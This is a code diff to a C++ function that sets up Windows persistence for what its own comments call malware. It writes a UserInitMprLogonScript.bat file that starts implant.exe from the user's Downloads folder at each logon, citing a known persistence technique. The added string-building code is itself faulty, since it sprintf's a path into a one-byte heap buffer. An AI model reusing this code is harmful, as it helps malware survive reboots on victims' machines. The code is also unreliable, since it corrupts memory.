@@ -1,7 +1,7 @@
 #include "persist.h"
 
 
-void persist_execution(void){
+void persist_execution(std::string username){
 
     /* 
     The bat file is in the same directory for reference.
@@ -13,19 +13,24 @@ void persist_execution(void){
 
    // Persistent method found here
    // https://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/
-   mkdir("c:\\test");
+
+   std::string path;
+   char* c = strcpy(new char[path.length() + 1], path.c_str());
+   sprintf(c,"@start \"c:\\users\\%s\\Downloads\\implant.exe\\\"\n",username.c_str());
+   path.assign(c,strlen(c));
+
+
+   mkdir("c:\\Batch");
 
    // Writes to a new bat file
    std::ofstream batfile;
-   batfile.open("c:\\test\\UserInitMprLogonScript.bat");
+   batfile.open("c:\\Batch\\UserInitMprLogonScript.bat");
 
    // Commands for file
    batfile << "@echo off\n";
-
    //change this line with our malware exe
-   batfile << "@start \"c:\\users\\Downloads\\implant.exe\\\"\n";
+   batfile << path;
    batfile << "@pause\n";
-   
    // Close the file since finished with writing
    batfile.close();
 
